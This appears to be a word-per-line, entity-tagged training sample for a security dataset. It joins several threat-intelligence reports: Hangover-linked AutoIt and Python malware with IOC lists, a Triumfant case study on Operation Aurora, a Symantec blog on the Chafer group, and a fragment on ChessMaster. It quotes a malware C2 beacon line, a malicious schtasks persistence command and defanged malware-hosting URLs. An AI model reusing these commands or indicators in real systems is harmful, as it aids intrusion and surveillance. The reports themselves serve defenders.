with
the
previously
mentioned
malicious
domains
.

Passive
DNS
investigation
and
malware
hosting
data
shows
additional
overlaps
with
the
domains
newsfairprocessing[.]com B_url.unknown
and
manufacturing-minds[.]com B_url.unknown
.

These
domains
were
registered
to
the
registrant
tomhanks542
@
gmail[.]com
.

Malware
referenced
in
relation
to
these
domains
is
for
example
:
md5
:
6f9f2e57eb06c5385f7e9370a71aa34b B_hash
.

This
is
a
MINGW
C++
keylogger
,
hosted
at
:
hxxp://newsfairprocessing[.]com/imopo99/plugins/rpcapd.exe B_url.unknown

hxxp://necessaries-documentation[.]com/khtergf5541/plugins/rpcapd.exe B_url.unknown

AutoIt

Though
many
of
the
malwares
we
have
examined
in
this
campaign
were
based
on
Python
,
a
number
of
similar
malware
files
were
found
to
be
based
on
a
different
scripting
language
–
AutoIt
.
One
such
malware
is
known
under
the
family
name
Emupry
or
AutoIt/Emupry
.

The
executable
file
'
Quetta_Killings_Footage.exe B_malware.unknown
'
(
md5
387947d5891aeb2c32f231e9abadfcec B_hash
)
connects
to
the
known
malicious
domain
communication-principals[.]com B_url.unknown
.

When
the
AutoIt
script
is
extracted
we
see
that
important
variables
are
base64-encoded
.

For
clarity
,
these
have
shown
inline
as
comments
below
:

Very
similar
AutoIt
malware
was
found
for
the
following
C&C
servers
(
domains
in
bold
were
documented
in
the
original
Hangover
report
)
:

MD5
C&C
domain

8c18852f79f14880ed9bd1d3be2fa48c B_hash
alertmymail[.]com B_url.cncsvr
ddd6b9bef4d37b43484d1a0eab4753c6 B_hash
alertmymail[.]com B_url.cncsvr
99f7cb87a4acbbd2aed2c4e860cd0f5a B_hash
necessaries-documentation[.]com B_url.cncsvr
04af2e8a7a1e934ab2000d701948a657 B_hash
newsfairprocessing[.]com B_url.cncsvr
1f72e19999d56a11cd564d1f7b0652e7 B_hash
onestop-shops[.]com B_url.cncsvr
2683e1d77b20e7aa75ade640ddb522d6 B_hash
onestop-shops[.]com B_url.cncsvr
6d6fe7d36e1c43aab534644378d56dfb B_hash
westdelsys[.]com B_url.cncsvr
14a11b125f32a5a5773c23021ac4c1a1 B_hash
manufacturing-minds[.]com B_url.cncsvr
84e2d98e4b3272b953b63d2021735fd3 B_hash
cloudone-opsource[.]com B_url.cncsvr
fcccf9cb698297bb686561e7af7dad94 B_hash
servicesprocessing[.]com B_url.cncsvr
f0ef59265610dedab40f8386af79f861 B_hash
knight-quest[.]com B_url.cncsvr

HTTP
request
format

Note
the
form
of
the
HTTP
requests
used
by
this
AutoIt
malware
:
http://server/folder/online.php?sysname=
.

The
Python
malware
we
mentioned
first
in
this
article
constructed
identical
requests
:
dfiles5
=
urlopen
(
'
http
:
/
/
'
+
getserver
+
foldername+
'
/
online
.
php
?
sysname
=
'
+
cname
+
'
'
)

This
request
form
was
used
in
a
number
of
Hangover-related
cases
as
well
.

Given
the
similarities
in
methodology
and
targeting
we
consider
it
highly
likely
that
the
current
attack
malware
and
the
Hangover
infrastructures
are
related
.

It
points
towards
the
use
of
the
same
backend
infrastructure
,
designed
to
control
different
types
of
malware
.

Above
:
Infrastructure
map
.

Conclusion

This
is
an
operation
of
far
smaller
scope
than
the
original
Hangover
infrastructure
;
but
as
more
capacity
is
rebuilt
this
might
grow
.

We
will
keep
an
eye
on
what
happens
in
this
space
.

It
is
noteworthy
that
they
have
adopted
the
use
of
scripting
langauages
for
this
type
of
data
theft;
scripts
are
easy
to
maintain
even
by
novice
programmers
.

Indicators
:
Domains

accountsloginmail-process[.]com B_url.unknown
alertmymail[.]com B_url.unknown
alertmymailsnotify[.]com B_url.unknown
cloudone-opsource[.]com B_url.cncsvr
communication-principals[.]com B_url.unknown
devilcreator[.]com B_url.unknown
download-mgrwin[.]com B_url.cncsvr
games-playbox[.]com B_url.cncsvr
knight-quest[.]com B_url.cncsvr
manufacturing-minds[.]com B_url.unknown
necessaries-documentation[.]com B_url.unknown
newsfairprocessing[.]com B_url.unknown
onestop-shops[.]com B_url.cncsvr
servicesloginmail-process[.]com B_url.unknown
servicesprocessing[.]com B_url.unknown
techto-earth[.]com B_url.cncsvr
websourceing[.]com B_url.unknown
westdelsys[.]com B_url.unknown
worldvoicetrip[.]com B_url.cncsvr

Indicators
:
IP
addresses

176.56.238.177
213.229.64.222
37.59.175.131
46.32.235.162
81.4.125.90

Indicators
:
Malware
MD5

04af2e8a7a1e934ab2000d701948a657 B_hash
a24137ea1a87b89f24ecaa0b9cb5382a B_hash
14a11b125f32a5a5773c23021ac4c1a1 B_hash
dedb56941cfaf1a650e38ba2b43c8e2b B_hash
1f72e19999d56a11cd564d1f7b0652e7 B_hash
0392fb51816dd9583f9cb206a2cf02d9 B_hash
2683e1d77b20e7aa75ade640ddb522d6 B_hash
6ec82e9eccb9bee050c9f7f2750d0c7c B_hash
387947d5891aeb2c32f231e9abadfcec B_hash
9d299d3a074f2809985e0317b9c461eb B_hash
6d6fe7d36e1c43aab534644378d56dfb B_hash
acfada8e91eda6cca2da66bbb032d924 B_hash
84e2d98e4b3272b953b63d2021735fd3 B_hash
c571b77469ad3c5ef336860605ee85c6 B_hash
8c18852f79f14880ed9bd1d3be2fa48c B_hash
e013691e702778fa6dbc35b15555c3c2 B_hash
99f7cb87a4acbbd2aed2c4e860cd0f5a B_hash
e6d9fce2c6e766b0899ac2e1691b8097 B_hash
a8bc0a09b5ee1e9ff40eac10ba0d43ed B_hash
f2a1ca02bf4a63a3d4a6c6464f5a925b B_hash
ddd6b9bef4d37b43484d1a0eab4753c6 B_hash
0739e1aea8c2928b9d1b3bcd145e0bcb B_hash
f0ef59265610dedab40f8386af79f861 B_hash
4a9a912a8610495029ef3df813272d8a B_hash
fcccf9cb698297bb686561e7af7dad94 B_hash
eeaf96b1988c7016780c0d91ce2451c8 B_hash
05dc62dcd4ddc9f2a79c5d23647c25c2 B_hash
f5d4664a607386c342fdd3358ea38962 B_hash
349583df5921e3d9fca9d4864072f6ca B_hash
f68eb7db21cd8abf5f60b16ca6c6a5e7 B_hash
6f9f2e57eb06c5385f7e9370a71aa34b B_hash
664f32f06dd7bd8c94df6edfcf6285da B_hash
8dbadff3529ca03b8d453a7c9aaf3c6c B_hash
6dc9eee24f8d5cba1ca3919b87507d86 B_hash

Passive
DNS
data
used
for
this
article
were
provided
by
Farsight
Security
,
Inc
.
Triumfant
has
performed
extensive
research
into
the
behaviors
of
the
recent
attack
directed
at
Google
called
Operation B_malware.infosteal
Aurora I
.

This
case
study
provides
a
detailed
description
of
how
Triumfant
would
detect
,
analyze
and
remediate
the
attack
on
an
endpoint
machine
running
the
Triumfant
agent
.

In
the
interest
of
full
disclosure
,
Triumfant
had
no
direct
interaction
with
the
attack
either
directly
on
Triumfant
's
own
endpoints
or
indirectly
through
a
Triumfant
customer
.

The
analysis
is
based
on
detailed
information
collected
through
a
variety
of
publically
available
research
performed
by
reliable
sources
that
performed
hands-on
analysis
of
the
attack
.

Based
on
this
research
,
Triumfant
is
fully
confident
that
our
software
would
have
detected
the
attack
and
built
a
remediation
that
would
have
restored
the
machine
to
its
pre-attack
condition
.

The
Operation B_malware.infosteal
Aurora I
attack
falls
squarely
into
one
of
the
classes
of
attacks
that
Triumfant
excels
at
detecting
:
targeted
attacks
engineered
to
evade
traditional
network
and
endpoint
protections
.

While
the
actual
attack
vector
used
was
not
exceptionally
sophisticated
,
the
attack
was
created
to
have
a
digital
signature
that
would
not
be
detected
by
antivirus
tools
.

The
attack
also
took
steps
to
protect
and
obscure
itself
from
detection
once
it
infected
a
machine
.

The
case
study
steps
through
the
process
in
four
parts
:
initial
detection
,
diagnosis
,
the
assimilation
of
data
about
the
attack
into
the
Triumfant
knowledge
base
,
and
remediation
of
the
affected
machine
.

Detection
The
malicious
code
used
by
Operation B_malware.infosteal
Aurora I
created
several
service
keys
during
three
specific
steps
:
execution
of
the
dropper
,
the
first
stage
of
installation
,
and
the
second
stage
of
installation
.

Some
of
these
keys
are
subsequently
deleted
but
at
least
one
was
persistent
.

The
appearance
of
one
or
more
of
these
keys
would
be
interpreted
as
a
marker
of
potential
malicious
activity
by
the
Triumfant
real-time
malware
scan
and
would
therefore
trigger
the
detection
process.i
The
first
step
in
the
detection
process
would
be
a
request
by
the
agent
to
the
server
requesting
permission
for
the
agent
to
execute
a
full
scan
of
the
machine
.

The
purpose
of
this
scan
is
to
capture
all
of
the
changes
to
that
machine
since
the
previous
scan
results
were
processed
as
part
of
the
normal
agent/server
interaction
that
occurs
every
24
hours
.

The
Triumfant
server
would
respond
within
seconds
,
authorizing
the
scan
and
throttling
up
the
agent
to
complete
the
scan
as
rapidly
as
possible
,
collecting
all
200,000
plus
attributes
in
under
a
minute
.

The
resulting
scan
would
captures
the
state
of
the
machine
immediately
after
infection
,
providing
the
raw
material
for
diagnosis
so
the
analytics
could
verify
the
machine
is
under
attack
and
identify
all
of
the
primary
and
secondary
artifacts
of
the
attack
.

Diagnosis
The
Triumfant
server
would
receive
the
full
scan
,
recognize
that
it
was
executed
as
a
result
of
suspicious
behavior
,
and
immediately
compare
it
to
the
adaptive
reference
model
(
the
unique
context
built
by
our
patented
analytics
)
.

The
result
of
this
comparison
would
be
a
set
of
anomalous
files
and
registry
keys
.

The
fact
that
the
files
and
keys
associated
with
Operation B_malware.infosteal
Aurora I
have
random
names
would
guarantee
that
they
would
be
perceived
as
anomalous
despite
the
fact
that
humans
might
tend
to
confuse
them
with
legitimate
Windows
services
.

Further
analysis
would
then
be
applied
to
the
anomaly
set
to
identify
important
characteristics
and
functional
impacts
.

In
this
case
the
salient
characteristics
are
an
anomalous
service
and
a
number
of
anomalous
system32
files
.

The
discovery
of
an
anomalous
service
would
cause
the
Triumfant
server
to
build
a
probe
to
be
sent
to
the
agent
for
execution
to
gather
more
data
to
complete
the
analysis
.

In
this
case
,
the
probe
would
contain
a
list
of
all
of
the
anomalous
attributes
found
by
the
server
during
its
analysis
.

Such
probes
leverage
a
series
of
correlation
functions
designed
to
partition
the
anomalous
attributes
associated
with
an
attack
into
related
groups
.

For
Operation B_malware.infosteal
Aurora I
these
correlation
functions
would
group
all
of
the
anomalous
attributes
and
then
perform
a
risk
assessment
on
this
group
.

In
this
specific
case
,
this
analysis
would
find
that
the
malicious
attack
is
communicating
over
the
internet
.

The
cumulative
results
of
the
correlation
and
risk
assessment
would
then
be
sent
back
to
the
Triumfant
server
.

This
new
information
is
then
processed
and
classified
as
an
'Anomalous
Application
'
with
a
complete
analysis
of
the
changes
that
composed
the
attack
.

This
data
would
show
the
full
set
of
changes
associated
with
the
attack
such
as
files
,
registry
keys
,
2010
–
Triumfant
,
Incorporated

processes
,
ports
,
services
,
and
event
logs
that
were
added
,
changed
,
or
deleted
as
part
of
the
attack
.

The
data
about
the
attacks
would
be
posted
at
the
console
and
the
Triumfant
server
would
alert
the
appropriate
personnel
based
on
the
established
reporting
and
alert
protocols
.

Personnel
could
then
access
the
correlated
attack
information
and
the
corresponding
risk
assessment
who
could
then
take
appropriate
actions
including
the
ability
to
save
the
analysis
to
readily
share
the
data
with
CIRT
and
forensics
teams
.

Knowledge
Base
Triumfant
has
the
ability
to
save
the
analysis
from
any
anomalous
activity
and
leverage
that
data
to
create
what
Triumfant
calls
a
Recognition
Filter
that
becomes
a
permanent
part
of
the
knowledge
base
contained
in
the
adaptive
reference
model
.

These
Recognition
Filters
have
a
number
of
benefits
.

First
,
they
provide
a
very
precise
mechanism
for
storing
and
sharing
knowledge
about
an
incident
.

Second
,
they
allow
the
system
to
search
for
any
other
instances
of
that
particular
condition
on
other
machines
.

Third
,
they
enable
the
operator
to
pre-authorize
automatic
responses
-
such
as
automatic
remediation
-
should
that
incident
be
detected
in
the
future
.

In
the
case
of
Operation B_malware.infosteal
Aurora I
,
an
analyst
could
save
the
analysis
and
build
a
filter
specifically
about
this
attack
.

Once
built
,
the
filter
could
be
used
to
check
other
endpoint
machines
(
the
entire
population
or
specified
groups
)
for
infection
.

This
mechanism
uses
acquired
knowledge
to
address
broad
attacks
before
they
have
the
chance
to
spread
beyond
their
initial
penetration
.

These
filters
are
also
more
resilient
than
digital
signatures
because
they
use
wildcarding
to
continue
to
detect
the
attack
even
as
it
morphs
its
basic
signature
over
time
to
avoid
traditional
signature
based
tools
.

Remediation
The
ability
to
identify
and
correlate
all
of
the
changes
associated
with
any
attack
provides
a
depth
of
information
that
enables
Triumfant
to
build
a
contextual
and
situational
remediation
that
surgically
and
reliably
removes
the
components
of
that
attack
without
reimaging
the
machine
.

This
remediation
is
built
to
exactly
match
the
attributes
of
the
anomalous
application
,
in
this
case
Operation B_malware.infosteal
Aurora I
,
on
an
attribute
by
attribute
basis
.

For
Operation B_malware.infosteal
Aurora I
,
Triumfant
would
construct
a
remediation
to
address
all
of
the
changes
associated
with
the
attack
,
restoring
the
altered
attributes
to
their
pre-attack
condition
.

This
includes
the
changes
Aurora
makes
to
affected
machine
's
configuration
settings
to
either
execute
or
hide
itself
.

The
files
added
to
the
machine
would
be
deleted
,
and
any
files
deleted
or
corrupted
would
be
remediated
using
Triumfant
's
patent
pending
donor
technology.ii
Summary
Operation B_malware.infosteal
Aurora I
is
illustrative
of
the
targeted
and
well
engineered
attacks
that
characterize
the
evolving
threats
businesses
and
government
agencies
face
daily
.

Based
on
the
available
data
regarding
Operation B_malware.infosteal
Aurora I
,
Triumfant
can
say
with
confidence
that
Resolution
Manager
would
have
detected
the
attack
,
identified
changes
associated
with
the
primary
and
collateral
damage
done
to
the
affected
machines
,
and
used
that
data
to
build
a
remediation
to
address
the
specific
elements
of
the
attack
.

Within
five
minutes
of
the
infection
Triumfant
would
have
analyzed
the
attack
and
created
a
remediation
to
return
the
machine
to
its
pre-attack
condition
pending
confirmation
by
the
administrator
.

This
ability
to
detect
and
remediate
the
attacks
that
evade
traditional
endpoint
protections
demonstrates
the
unique
capabilities
of
Triumfant
's
technology
.

i
Triumfant
uses
two
continuous
scan
cycles
.

One
is
a
scan
for
markers
of
malicious
activity
that
runs
approximately
every
thirty
seconds
.

The
second
is
a
continuous
scan
of
every
attribute
on
the
machine
that
identifies
and
collects
changes
to
those
attributes
and
communicates
them
to
the
server
on
a
24
hour
reporting
cycle
.

ii
Triumfant
leverages
the
knowledge
contained
in
the
adaptive
reference
model
to
find
another
machine
that
has
the
proper
version
of
corrupted
or
missing
files
–
validated
to
the
specific
release
number
and
MD5
hash
-
and
uses
that
machine
as
a
donor
to
repair
the
affected
machine
.

This
technology
is
patent
pending
.
Investigation
Team

Blogs

POSTED
:
28
FEB
,
2018
7
MIN
READ

THREAT
INTELLIGENCE
(
/BLOGS/THREAT-INTELLIGENCE
)

Chafer
:
Latest
Attacks
Reveal
Heightened
Ambitions

Iran-based
group
remains
highly
active
and
is
moving
up
the
telecoms
and
transport
supply
chain
to
facilitate
widescale
surveillance
of
targets
.

Chafer
,
the
Iran-based
targeted
attack
group
,
mounted
further
operations
throughout
2017
,
attacking
more
organizations
in
the
Middle
East
and
beyond
,
and
deploying
several
new
tools
.

The
group
staged
a
number
of
ambitious
new
attacks
last
year
,
including
the
compromise
of
a
major
telecoms
services
provider
in
the
region
.

There
is
also
evidence
that
it
attempted
to
attack
a
major
international
travel
reservations
firm
.

Chafer
appears
to
be
primarily
engaged
in
surveillance
and
tracking
of
individuals
,
with
most
of
its
attacks
likely
carried
out
to
gather
information
on
targets
or
facilitate
surveillance
.

Chafer
has
been
active
since
at
least
July
2014
and
its
activities
were
first
exposed
by
Symantec
in
December
2015
(
https://www.symantec.com/connect/blogs/iran-based-attackers-use-back-door-threats-spy-middle-eastern-targets B_url.normal
)
,
when
it
was
found
to
be
conducting
targeted
surveillance
of
domestic
and
international
targets
.

At
the
time
,
many
of
its
targets
were
individuals
located
in
Iran
,
and
it
had
already
begun
compromising
telecom
providers
as
well
as
airline
companies
in
the
Middle
East
region
.

'
Iran-based
Chafer
attack
group
mounted
further
operations
against
more
organizations
in
the
Middle
East
in
2017
http://symc.ly/2sXMZio B_url.normal
'


CLICK
TO
TWEET
(
//TWITTER.COM/INTENT/TWEET?TEXT=IRAN-BASED%20CHAFER%20ATTACK%20GROUP%20MOUNTED%20FURTHER%20OPERATIONS%20AGAINST%20MORE%20ORGANIZATIONS%20IN%20 B_url.normal

Expansion
of
operations

Chafer
appears
to
have
been
undeterred
by
its
exposure
in
2015
and
continued
to
be
very
active
during
2017
,
using
seven
new
tools
,
rolling
out
new
infrastructure
,
and
attacking
nine
new
target
organizations
in
the
region
.

The
group
hit
organizations
in
Israel
,
Jordan
,
the
United
Arab
Emirates
,
Saudi
Arabia
,
and
Turkey
.

Sectors
targeted
included
airlines
;
aircraft
services
;
software
and
IT
services
companies
serving
the
air
and
sea
transport
sectors
;
telecoms
services
;
payroll
services
;
engineering
consultancies
;
and
document
management
software
.

Outside
of
the
Middle
East
,
Symantec
has
also
found
evidence
of
attacks
against
one
African
airline
and
attempts
to
compromise
an
international
travel
reservations
firm
.

Ambitious
new
targets

One
of
the
organizations
compromised
by
Chafer
in
2017
was
a
telecoms
services
provider
in
the
Middle
East
,
which
sells
its
solutions
to
multiple
telecoms
operators
in
the
region
.

The
ultimate
goal
of
the
attack
may
have
been
to
facilitate
surveillance
of
end-user
customers
of
telecoms
operators
.

By
moving
two
steps
up
the
supply
chain
the
attackers
could
potentially
have
carried
out
surveillance
on
a
vast
pool
of
end-users
.

Alongside
evidence
of
compromise
of
the
organization
itself
,
Symantec
also
found
a
copy
of
one
of
the
company's
own
files
,
relating
to
its
messaging
software
,
on
a
staging
server
used
by
Chafer
.

The
file
was
in
a
directory
alongside
a
number
of
hacking
tools
used
by
the
attackers
.

A
second
target
outside
the
Middle
East
provides
further
confirmation
of
Chafer's
heightened
ambitions
in
recent
times
.

Symantec
found
evidence
that
it
had
tried
to
compromise
a
large
international
travel
reservations
firm
.

There
was
no
indication
that
the
attack
was
successful
,
but
Chafer
did
successfully
infiltrate
an
African
airline
that
is
a
customer
of
the
reservations
firm
.

The
group
hit
organizations
in
Israel
,
Jordan
,
the
United
Arab
Emirates
,
Saudi
Arabia
,
and
Turkey
.

Sectors
targeted
included
airlines
;
aircraft
services
;
software
and
IT
services
companies
serving
the
air
and
sea
transport
sectors
;
telecoms
services
;
payroll
services
;
engineering
consultancies
;
and
document
management
software
.

How
Chafer
infects
targets

In
the
earlier
attacks
from
2015
,
Symantec
found
evidence
that
Chafer
had
been
compromising
targeted
organizations
by
attacking
their
web
servers
,
likely
through
SQL
injection
attacks
,
in
order
to
drop
malware
onto
them
.

In
2017
,
the
group
added
a
new
infection
method
to
its
toolkit
,
using
malicious
documents
which
are
likely
circulated
using
spear-phishing
emails
sent
to
individuals
working
in
targeted
organizations
.

These
documents
were
Excel
spreadsheets
.

When
opened
,
they
downloaded
a
malicious
VBS
file
that
in
turn
ran
a
PowerShell
script
.

Several
hours
later
,
a
dropper
would
appear
on
the
compromised
computer
.

This
would
install
three
files
on
the
computer
,
an
information
stealer
,
a
screen
capture
utility
,
and
an
empty
executable
.

The
screen
capture
utility
appeared
to
be
used
for
initial
information
gathering
,
as
it
was
only
used
briefly
at
the
beginning
of
each
infection
and
not
seen
again
.

The
information
stealer
was
capable
of
stealing
the
contents
of
the
clipboard
,
taking
screenshots
,
recording
keystrokes
and
stealing
files
and
user
credentials
.

After
this
initial
activity
,
the
attackers
usually
downloaded
more
of
their
tools
to
the
computer
using
a
PowerShell
downloader
and
began
moving
across
the
victim's
network
.

New
tools
used
to
compromise
networks

Symantec
has
seen
Chafer
use
seven
new
tools
in
its
more
recent
campaigns
,
in
addition
to
malware
it
is
previously
known
to
have
used
.

Most
of
the
new
tools
are
freely
available
,
off-the-shelf
tools
,
put
to
a
malicious
use
.

The
new
tools
include
:

Remcom
:
An
open-source
alternative
to
PsExec
,
which
is
a
Microsoft
Sysinternals
tool
used
for
executing
processes
on
other
systems
.

Non-sucking
Service
Manager
(
NSSM
)
:
An
open-source
alternative
to
the
Windows
Service
Manager
which
can
be
used
to
install
and
remove
services
and
will
restart
services
if
they
crash
.

A
custom
screenshot
and
clipboard
capture
tool
.

SMB
hacking
tools
:
Used
in
conjunction
with
other
tools
to
traverse
target
networks
.

These
tools
include
the
EternalBlue
exploit
(
which
was
previously
used
by
WannaCry B_malware.ransom
and
Petya B_malware.ransom
)
.

GNU
HTTPTunnel
:
An
open-source
tool
that
can
create
a
bidirectional
HTTP
tunnel
on
Linux
computers
,
potentially
allowing
communication
beyond
a
restrictive
firewall
.

UltraVNC
:
An
open-source
remote
administration
tool
for
Microsoft
Windows
.

NBTScan
:
A
free
tool
for
scanning
IP
networks
for
NetBIOS
name
information
.

Chafer
has
also
continued
to
use
tools
previously
associated
with
the
group
,
including
its
own
custom
backdoor
Remexi B_malware.backdoor
(
Backdoor
.
Remexi B_malware.backdoor
(
https://www.symantec.com/security_response/writeup.jsp?docid=2015-110911-3433-99 B_url.normal
)
)
;
the
aforementioned
PsExec
;
Mimikatz
(
Hacktool.Mimikatz
(
https://www.symantec.com/security_response/writeup.jsp?docid=2012-042615-3731-99 B_url.normal
)
)
,
a
free
tool
capable
of
changing
privileges
,
exporting
security
certificates
,
and
recovering
Windows
passwords
in
plaintext
;
Pwdump
(
Pwdump
(
https://www.symantec.com/security_response/writeup.jsp?docid=2005-032616-0025-99 B_url.normal
)
)
a
tool
that
is
used
to
grab
Windows
password
hashes
from
a
remote
Windows
computer
;
and
Plink
(
PuTTY
Link
)
a
command-line
utility
used
to
create
reverse
SSH
sessions
.

Chafer
has
used
these
tools
in
concert
to
traverse
targeted
networks
.

The
group
has
recently
adopted
NSSM
to
maintain
persistence
and
install
the
service
which
runs
Plink
on
the
compromised
computer
.

Plink
is
then
used
to
open
reverse
SSH
sessions
from
the
attacker's
server
to
the
RDP
port
on
the
victim
computer
.

This
presumably
gives
them
RDP
access
to
the
compromised
computer
.

Once
a
foothold
is
established
,
the
attackers
use
PsExec
,
Remcom
,
and
SMB
hacking
tools
to
begin
moving
across
the
victim's
network
.

New
infrastructure
in
use

Chafer
has
also
begun
using
new
infrastructure
.

The
domain
win7-updates[.]com B_url.cncsvr
is
being
used
by
the
group
as
a
command
and
control
address
.

The
domain
has
been
referenced
several
times
in
command
lines
,
e.g
:
s224.win7-update[.]com B_url.cncsvr
s5060.win7-update[.]com B_url.cncsvr
s21.win7-update[.]com B_url.cncsvr

It
has
also
been
embedded
in
a
dropper
:
hxxp://wsus65432.win7-update[.]com B_url.distribute

Symantec
also
discovered
multiple
IP
addresses
that
were
used
as
infrastructure
by
the
attackers
.

It
is
unclear
whether
these
were
leased
or
hijacked
,
but
the
fact
that
many
of
them
appear
to
follow
a
pattern—with
the
latter
three
numbers
of
each
address
often
running
in
sequence—makes
it
likely
they
were
deliberately
selected
by
the
attackers
.

107.191.62[.]45 B_ip.cncsvr
94.100.21[.]213 B_ip.cncsvr
89.38.97[.]112 B_ip.cncsvr
148.251.197[.]113 B_ip.cncsvr
83.142.230[.]113 B_ip.cncsvr
87.117.204[.]113 B_ip.cncsvr
89.38.97[.]115 B_ip.cncsvr
87.117.204[.]115 B_ip.cncsvr
185.22.172[.]40 B_ip.cncsvr
92.243.95[.]203 B_ip.cncsvr
91.218.114[.]204 B_ip.cncsvr
86.105.227[.]224 B_ip.cncsvr
91.218.114[.]225 B_ip.cncsvr
134.119.217[.]84 B_ip.cncsvr

In
one
case
,
Symantec
found
what
appeared
to
be
a
staging
server
used
by
the
attackers
.

The
server
belonged
to
one
of
the
targeted
organizations
.

Copies
of
many
of
the
tools
used
by
the
group
were
discovered
on
the
server
.

The
attackers
didn't
even
bother
hiding
their
activity
and
saved
items
to
the
desktop
,
often
without
renaming
them
.

Links
to
Crambus
?

Chafer's
activities
have
some
links
to
another
group
known
as
Crambus
(
aka
Oilrig
)
.

Both
groups
have
been
observed
using
the
same
IP
address
for
command
and
control
purposes
.

In
addition
to
this
,
both
groups
have
been
seen
using
a
similar
infection
vector
,
namely
an
Excel
document
which
drops
a
malicious
VBS
file
.

Both
VBS
files
reference
the
same
file
path
,
containing
the
same
misspelling
:
'
schtasks.exe B_malware.normal
/
create
/
F
/
sc
minute
/
mo
2
/
tn
'
UpdatMachine
'
/
tr
%
LOCALAPPDATA
%
\
microsoft
\
Feed
\
Y658123.vbs B_malware.unknown
'

Are
the
two
groups
one
and
the
same
?
While
this
may
be
a
possibility
,
at
present
there
isn't
enough
evidence
to
support
that
hypothesis
.

What
is
more
likely
is
that
the
two
groups
are
known
to
each
other
and
enjoy
access
to
a
shared
pool
of
resources
.

Growing
threat
to
organizations
in
the
Middle
East

Chafer's
recent
activities
indicate
that
the
group
remains
highly
active
,
is
continuing
to
hone
its
tools
and
tactics
,
and
has
become
more
audacious
in
its
choice
of
targets
.

Although
a
regional
actor
,
the
group
has
followed
two
trends
seen
globally
among
targeted
attack
groups
.

The
first
is
a
greater
reliance
on
freely
available
software
tools
,
also
known
as
'
living
off
the
land
.
'

By
limiting
their
use
of
malware
,
groups
such
as
Chafer
hope
to
be
less
conspicuous
on
a
victim's
network
and
,
if
discovered
,
make
their
attack
more
difficult
to
attribute
.

The
second
trend
is
towards
attacks
on
the
supply
chain
,
compromising
organizations
with
the
goal
of
then
attacking
the
customers
,
or
even
the
customers
of
the
customers
,
of
those
organizations
.

These
attacks
require
more
'
steps
'
to
reach
their
ultimate
target
,
which
adds
additional
time
and
risk
for
attackers
to
reach
their
targets
.

However
these
attacks
also
leverage
trusted
channels
into
the
eventual
target
,
e.g.
,
through
a
trusted
supplier
,
allowing
attackers
to
potentially
circumvent
security
systems
at
the
organization
they
ultimately
wish
to
compromise
.

These
attacks
are
riskier
but
come
with
a
potentially
higher
reward
and
,
if
successful
,
could
give
the
attackers
access
to
a
vast
pool
of
potential
targets
.

Chafer's
recent
activities
indicate
that
the
group
remains
highly
active
,
is
continuing
to
hone
its
tools
and
tactics
,
and
has
become
more
audacious
in
its
choice
of
targets
.

Although
a
regional
actor
,
the
group
has
followed
two
trends
seen
globally
among
targeted
attack
groups
.

Protection

Symantec
has
the
following
protection
in
place
to
protect
customers
against
these
attacks
:

File-based
protection

Backdoor
.
Remexi B_malware.backdoor
(
https://www.symantec.com/security_response/writeup.jsp?docid=2015-110911-3433-99 B_url.normal
)

Backdoor
.
Remexi.B B_malware.backdoor
(
https://www.symantec.com/security_response/writeup.jsp?docid=2015-110911-4128-99 B_url.normal
)

Hacktool.Mimikatz
(
https://www.symantec.com/security_response/writeup.jsp?docid=2012-042615-3731-99 B_url.normal
)

Pwdump
(
https://www.symantec.com/security_response/writeup.jsp?docid=2005-032616-0025-99 B_url.normal
)

IPS
:
network-based
protection

System
Infected
:
Backdoor
.
Remexi B_malware.backdoor
Activity
(
http://www.symantec.com/security_response/attacksignatures/detail.jsp?asid=28967 B_url.normal
)

Security
Response
Attack
Investigation
Team

The
Attack
Investigation
Team
is
a
group
of
security
experts
within
Symantec
Security
Response
whose
mission
is
to
investigate
targeted
attacks
,
drive
enhanced
protection
in
Symantec
products
,
and
offer
analysis
which
helps
customers
respond
to
attacks
.

About
the
Author
Home
Categories
Home
'
Targeted
Attacks
'
ChessMaster
Adds
Updated
Tools
to
Its
Arsenal
ChessMaster
Adds
Updated
Tools
to
Its
Arsenal
Posted
on
:
March
29
,
2018
at
5:00
am
Posted
in
:
Targeted
Attacks
Author
:
Trend
Micro
by
Tamada
Kiyotaka
and
MingYen
Hsieh
Trend
Micro
discovered
the
ChessMaster
campaign
back
in
July
2017
as
part
of
our
monitoring
efforts
to
protect
our
customers
.

At
the
time
,
we
found
ChessMaster
targeting
different
sectors
from
the
academe
to
media
and
government
agencies
in
Japan
.

The
threat
group
used
a
variety
of
attack
tools
and
techniques
to
spy
on
their
target
organizations
.

Back
then
,
we
noted
that
ChessMaster
's
sophisticated
nature
implied
that
the
campaign
could
evolve
,
before
finding
changes
in
the
tools
and
tactics
used
in
the
campaign
a
few
months
later
.

While
the
original
campaign
was
comprehensive
and
used
remote
access
Trojans
(
RATs
)
such
as
ChChes B_malware.backdoor
and
RedLeaves
,
this
new
campaign
used
a
new
backdoor
(
Detected
by
Trend
Micro
as
BKDR_ANEL.ZKEI
)
that
leverages
the
CVE-2017-8759
vulnerability
for
its
cyberespionage
activities
.

In
this
blog
post
,
we
analyze
ChessMaster
's
current
status
,
including
the
updated
tools
in
its
arsenal
—
with
a
particular
focus
on
the
evolution
of
ANEL B_malware.backdoor
and
how
it
is
used
in
the
campaign
.

Search
:
Featured
Stories
systemd
Vulnerability
Leads
to
Denial
of
Service
on
Linux
qkG
Filecoder
:
Self-Replicating
,
Document-Encrypting
Ransomware
Mitigating
CVE-2017-5689
,
an
Intel
Management
Engine
Vulnerability
A
Closer
Look
at
North
Korea
's
Internet
From
Cybercrime
to
Cyberpropaganda
Security
Predictions
for
2018
Attackers
are
banking
on
network
vulnerabilities
and
inherent
weaknesses
to
facilitate
massive
malware
attacks
,
Point
of
Entry
Notable
Tools
July
ChessMaster
Campaign
Spear-phishing B_malware.backdoor
emails
containing
decoy
documents
Malicious
shortcut
(
LNK
)
files
and
PowerShell
Self-extracting
archive
(
SFX
)
Runtime
packers
Hacking
Tools
Second-stage
payloads
Backdoor
ChChes B_malware.backdoor
Technical
Analysis
November
ChessMaster
Campaign
Spear-phishing B_malware.backdoor
emails
containing
decoy
documents
exploiting
CVE-2017-8759
Current
ChessMaster
Campaign
Spear-phishing B_malware.backdoor
emails
containing
decoy
documents
exploiting
CVE-2017-11882
,
DDEAUTO
,
Microsoft
Office
Frameset
and
Link
auto
update
Koadic
Hacking
Tools
Second-stage
payloads
ANEL B_malware.backdoor
Koadic
Hacking
Tools
Second-stage
payloads
ANEL B_malware.backdoor
IoT
hacks
,
and
operational
disruptions
.

The
ever-shifting
threats
and
increasingly
expanding
attack
surface
will
challenge
users
and
enterprises
to
catch
up
with
their
security
